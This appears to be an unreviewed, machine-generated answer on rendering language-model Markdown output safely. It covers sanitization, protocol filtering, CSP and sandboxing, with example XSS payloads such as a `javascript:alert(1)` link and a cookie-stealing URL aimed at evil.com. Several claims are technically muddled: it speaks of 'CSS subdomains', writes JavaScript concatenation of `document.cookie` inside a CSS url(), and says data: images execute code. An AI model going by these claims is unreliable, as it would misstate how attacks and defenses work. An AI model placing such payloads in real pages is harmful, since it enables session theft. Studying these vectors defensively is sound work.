---
qid: ing_1d2ec4da93__fp__local
question: The model outputs markdown. How do you render it safely, and what specifically
  can go wrong?
topic: AI
model: openai/gpt-oss-20b
provider: lmstudio
input_tokens: 178
output_tokens: 654
total_tokens: 832
web_searches: 0
cost_usd: 0.0
generated_at: '2026-09-05T17:08:11-05:00'
sources: []
---

### Rendering Markdown Safely – From Problem to Principle

When a language model spits out arbitrary text that may contain Markdown, the **fundamental problem** is *trust*: we want users to see what they expect (styled text) while preventing attackers from hijacking the rendering context.

1. **Sanitization as a constraint‑optimization problem**  
   We must transform the user’s output into a subset of HTML that satisfies two constraints:  
   - **Correctness** – preserve formatting, links, images, etc.  
   - **Safety** – forbid any code that can alter the DOM or access privileged APIs.  
   The optimal solution is to parse Markdown → AST → *allowed‑tags* set (e.g., `<b>`, `<i>`, `<a href>` with whitelist of protocols) and then serialize back to HTML. This is an instance of *static analysis* on a user‑generated tree.

2. **Why it must work the way it does**  
   Markdown itself can embed raw HTML; if we blindly render that, an attacker could inject `<script>`, event handlers (`onload`), or malicious CSS. Even without JavaScript, malformed URLs (e.g., `javascript:`) or `data:` images can execute code when loaded.

3. **Concrete attack vectors**  
   - **XSS via attributes**: `<a href="javascript:alert(1)">`.  
   - **CSS leaks**: `style="background-image:url(javascript:…)"` or using `@import`.  
   - **Content‑Security‑Policy bypasses** through data URLs that contain executable scripts.  

4. **Defense layers**  
   1. *Strict tag/attribute whitelisting* (no `<script>`, no event attributes).  
   2. *Protocol filtering* (`http`, `https`, `mailto`).  
   3. *Content‑Security‑Policy* to block inline scripts and restrict sources.  
   4. *Sandboxed iframes* for user‑generated content when full isolation is required.

5. **Non‑obvious insight**  
   Even a perfectly sanitized HTML surface can leak information through **CSS subdomains** (e.g., `background-image: url('https://evil.com/steal?cookie='+document.cookie)`). The model’s output may contain innocuous-looking URLs that, when rendered in a user’s browser, exfiltrate data. Therefore, the safest rendering pipeline must also *sanitize* or *strip* all external resource references unless they come from a trusted domain list.

In short, safe Markdown rendering is an optimization over trust boundaries: parse → filter → policy‑enforced render. Anything that bypasses these steps—raw HTML, malicious URLs, or embedded CSS—is a potential vector for exploitation.

_Written by openai/gpt-oss-20b running locally. Machine-generated, not reviewed._
